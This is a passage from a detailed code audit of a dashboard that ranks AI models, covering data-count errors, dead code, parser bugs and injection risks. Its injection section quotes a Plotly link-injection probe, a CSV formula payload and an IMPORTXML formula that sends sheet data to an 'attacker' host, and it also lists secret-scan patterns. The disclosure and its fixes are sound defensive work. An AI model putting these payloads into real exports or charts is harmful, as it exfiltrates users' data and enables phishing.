| 9.9 | `manifest.json` publishes `upstream_records: 428` beside `kept: 148` | 428 is **host×model rows** (`data/scraper.py:57,155`; the `:117` aggregation on `(model, provider)` proves it), not distinct models. Distinct upstream = 148 + 4 + 10 = **162**, and `docs/app.js:90-91` correctly says "148 of 162". The honest and the misleading number sit in the same JSON. `tests/test_build_static.py:126` only asserts `>= kept` | rename to `upstream_host_model_rows`; add `distinct_upstream_models` |
| 9.10 | `"Bytedance"` and `"ByteDance Seed"` are two providers | 6 + 3 models split across spellings; `get_image_providers()` returns 39 uniques where the real count is 38. `data/image_models.py:19-20` already maps both to `#38bdf8` with an "(alt spelling)" comment — for colour only, never identity. Same pattern for Stability/Playground/Leonardo. *Mitigation:* case-sensitive sort puts the two entries adjacent, so this is a wrong count and fragmented grouping, not a silent loss | alias map applied at parse time in `data/image_scraper.py:142` |
| 9.11 | Image palette lost 5 providers | `set(get_image_df().provider) - set(PROVIDER_COLORS)` = `['Api Airforce','Baidu','Microsoft AI','SpaceXAI','StepFun']` — **11 of 148 models render in fallback grey**, including MAI-Image-2.5 (elo 1307.72, top-5) and both grok-imagine entries. Meanwhile six map keys match nothing: `['Adobe','Leonardo AI','Microsoft Azure','Playground','Stability AI','xAI']`. The comment at `:15` claims the map "covers all providers seen in live AA data" | fold the aliases, add the three new names, and add the coverage assertion the LLM palette already satisfies (0/148 fall through) |

### 9.12 — Dead code, with one live trap `LOW` `CONFIRMED` (merged ×3)

Eight builders have **zero external references** anywhere in `.py`/`.js`/`.html`/`.json` (AST + grep, no dynamic-import escape hatch): `build_animated_pareto`, `build_context_chart`, `build_embedding_scatter`, `build_embedding_rankings`, `build_local_rankings`, `build_price_timeline`, `build_trends`, `build_value_chart` — plus `build_bump_chart`, which *is* imported (`app.py:40`) and never called. 1,275 LOC, all vendored by `build_static.py:142` (`"components/charts",  # whole dir`). Payload cost is negligible (14,746 of 4,040,968 bytes = 0.36%), so ignore the bandwidth argument.

Two things here actually matter:

1. **`context_chart._parse_context_k` (`:22-36`) has no `'M'` case.** `'1m' → nan`, `'2m' → nan`, `'200k' → 200.0`, `'32768' → 32.8`. Against the live cache that silently drops **52 of 148 models** — Claude Opus 5 (all tiers), Kimi K3 (max), GPT-5.6 Sol/Terra, Qwen3.8 Max — leaving 96 points with `max(context_k) = 524`, so the 1M reference line at `:84` can never draw while the 1M tick at `:114-115` is always present. `radar._context_k` (`:29-30`) parses `'m'` correctly. **Two parsers for the same strings, disagreeing.** This is a loaded gun: the module looks finished, so whoever wires up a Context tab ships a long-context chart that omits every long-context model.
2. **`app.py:44` and `:81` call `load_history()` and never read the result** — 90 CSVs, 23,742×10 rows, 81 ms and 7.2 MB, repaid on every hourly cache change. `data/raw/history/` has **no live consumer at all** while the bot keeps growing it.

Also: `image_scatter.py:281` hard-codes "119 models" in a subtitle against a 151-row frame. `build_report.py`/`build_presentation.py` cannot run (`ModuleNotFoundError: docx` / `pptx`, neither in `requirements.txt`) — and `build_report.py:347,369,389,448,521` hardcode absolute paths into a `~/.claude/image-cache/` directory **that no longer exists**, so it is unreproducible even with the deps installed.

**Fix** — delete the eight dead builders and the unused `load_history()` calls, or wire the history trio into a tab. Either way promote **one** context parser into `constants.py` and narrow `build_static.py:142` to an explicit module list.

### 9.13 — `docs/assets/style.css` is generated, unmarked, and clobbered `LOW` `CONFIRMED`

`build_static.py:106` copies `assets/style.css → docs/assets/style.css` on **both** build paths (`:242` full, `:249` `--data-only`, i.e. the hourly bot). The generated file is git-tracked, carries no banner, and is byte-identical (`md5 a8e92660…`) to its source — while its sibling `docs/assets/shell.css` is hand-maintained (`grep -n shell build_static.py` exits 1) and `docs/index.html:21-22` loads both identically. I confirmed the clobber is live: `docs/assets/style.css` mtime is from a build during this session, `assets/style.css` still reads Apr 10. `git log -1 3facb57` is titled *"fix(static): shell.css to survive rebuilds"* — this already bit once, and the response was to add a second file rather than mark the generated one.

**Fix** — prepend `/* GENERATED by build_static.py — edit assets/style.css instead */` in `copy_css()`, and either gitignore the copy or move `shell.css` into the source tree so `docs/assets/` has one rule.

---

## Theme 10 — Latent injection surfaces

All three require the third-party AA feed to carry hostile content. All three are cheap to close.

### 10.1 — Scraped names reach Plotly's rendered-text sinks unescaped `MED` `CONFIRMED`

Every **HTML** sink in this app is escaped (`static_api.py:97-99,195-197`; `docs/app.js:24-29`). The **Plotly text** path is escaped nowhere. `radar.py:109` interpolates the raw name into a hovertemplate: `f"<b>{model_name}</b><br>"`, and `:107` into the legend `name`. Probing with a poisoned frame (`<a href="//e.co">P</a>`), the raw payload lands in: radar `hovertemplate` + `name`; rankings `y[]` + annotation `text`; treemap `labels[]`; provider_leaderboard `y[]` ×3 + annotation. Same class at `rankings.py:64,135`, `pareto.py:133`, `quadrant.py:179`, `video_chart.py:247`, `value.py:73`, `cost_calc.py:95`.

I downloaded the pinned bundle (`cdn.plot.ly/plotly-3.0.1.min.js`, 4.65 MB) and read the renderer: the allowed-tag table includes `a` and `span`, and `convertToTspans` builds a real SVG `<a>`. Then I rendered it in a browser against that local bundle: **4 live anchors**, `href="//e.co"`, at `ytick|yaxislayer-above`, `legendtext|traces|legend`, `annotation-text|cursor-pointer`, and `slicetext|slice cursor-pointer|trace treemap`.

**Not XSS** — the href protocol allowlist has no `javascript:`, and `script-src` has no `'unsafe-inline'`. It is markup/phishing injection: a clickable link styled as a first-party chart label, plus `<span style=…>` text restyling. Committed data is currently clean (0 cells with `<>&"'` across all three CSVs).

**Fix** — escape at the choke point: make `clean_model_name()` (`constants.py:21`) HTML-escape `<`, `>`, `&` after truncation, add `clean_provider_name()`, and route every `text=` / `labels=` / `y=<name col>` / `name=` / annotation `text=` through them. For `radar.py:107-109`, stop interpolating into the template at all — move the name to `customdata` and use `%{customdata[0]}` like `pareto.py:70` already does (that also closes the `%{…}` directive surface).
**Verify** — mirror `test_raw_table_escapes_scraped_names`: assert no figure JSON contains a raw `<` originating from a data column.

### 10.2 — CSV export writes unescaped strings `MED` `CONFIRMED`

`static_api.py:298` is literally `return _apply_filters(...).to_csv(index=False)`. Reproduced with a poisoned frame:

```
=cmd|'/c calc'!A1,@SUM(1+1)*cmd,1m,63.05,20.0,52.534…
```

The `=` and `@` are the first characters of their cells. pandas quotes only for delimiters, and CSV quoting doesn't neutralise a leading `=` in Excel/Sheets anyway. `docs/app.js:723-731` hands the text to a Blob named `ai_frontier_export.csv` — a filename that invites a spreadsheet. `data/ingest.py:102-104` writes the same unsanitised frame to `data/raw/*.csv`, committed hourly. Higher payoff than 10.1: `=IMPORTXML("https://attacker/?"&A1,"//a")` exfiltrates the analyst's sheet on open, and nothing on screen showed the model name was a formula. Latent today (0 cells starting `= + - @ \t \r`).

**Fix** — prefix object-dtype cells whose first char is in `=+-@\t\r` with `'`, in `export_csv` **and** in `ingest.save_cache`.

### 10.3 — Supply chain `LOW` `CONFIRMED` ×2

- No SRI on either CDN script: `docs/index.html:23` (plotly 3.0.1) and `docs/pyworker.js:13,55` (`importScripts` of pyodide). `script-src` allows `https://cdn.jsdelivr.net`, which serves arbitrary npm packages (`curl` of `left-pad@1.3.0` → 200 `application/javascript`), so the CSP comment's claim that it "stops it fetching or executing anything" is overstated. *Refuted:* the "localStorage/cookies across github.io" impact is false — github.io is on the Public Suffix List and localStorage is per-origin; the site holds no user data. Real residual: a CDN compromise silently rewrites the pricing charts visitors act on. **Fix:** `integrity`/`crossorigin` on the plotly tag; self-host `pyodide.js` (importScripts can't carry SRI); drop both CDNs from `script-src`, leaving jsDelivr only in `connect-src`; add a test asserting every remote `<script>` has `integrity`.
- `.github/workflows/refresh.yml:11-12` grants `contents: write` and installs `pip install -r requirements.txt` with no lockfile and no `--require-hashes`; `requirements.txt` is entirely range-pinned; actions are floating tags (`@v4`, `@v5`). The job pushes `docs/` to `main`, which is the Pages source. No secret is exposed (the AA endpoint is unauthenticated — `data/scraper.py:29-41` sends only UA/Accept/Referer, and an `-S` scan for `sk-`/`ghp_`/`AKIA`/`Bearer ` across all 468 commits found nothing but binary zip diffs). The asset at risk is write access to the published site, on an hourly cadence. **Fix:** `pip-compile --generate-hashes` + `--require-hashes` (also removes the ad-hoc `pip install "plotly==6.5.2"` override); pin actions to SHAs; enable Dependabot.

---

## The four fixes that close the most ground

1. **One test that walks `app.layout`, collects every id, and asserts every callback dependency resolves.** Kills §5.2 outright and prevents its whole class.
2. **A `full_frame` argument (or precomputed thresholds) threaded into `build_quadrant`, `_pareto_frontier`, `_pick_elo_column`, `_add_pareto` and `_pick_api_tier`.** Closes all five of Theme 2. Then add an invariance test — "same input model, any filter, same visual output" — mirroring the bubble-size test that already exists.
3. **`if x is not None` instead of `if x:` at the six numeric/list sites, plus `canonical_provider()` in the recommender, plus data-derived filter options.** Closes §4.1, §4.2, §4.3, §4.5 and prevents §4.3's recurrence.
4. **Per-dataset scrape status in the manifest, driving the freshness badge from the *oldest* successful fetch.** Closes §7.1 and gives §1.3, §1.4 and §7.7's cadence gap somewhere to surface.

Three things in this report were already fixed once and regressed or were fixed on one side only: the `?tab=` guard (`app.py:883-887` vs `docs/app.js:761`), the white-empty-figure (`constants.py:349` docstring vs `quadrant.py:30`), and the dead-tag filter (`app.py:732-734` vs `docs/index.html:179`). In all three cases the fix landed as a patch at the call site rather than as an assertion. Until each has a test, expect them back.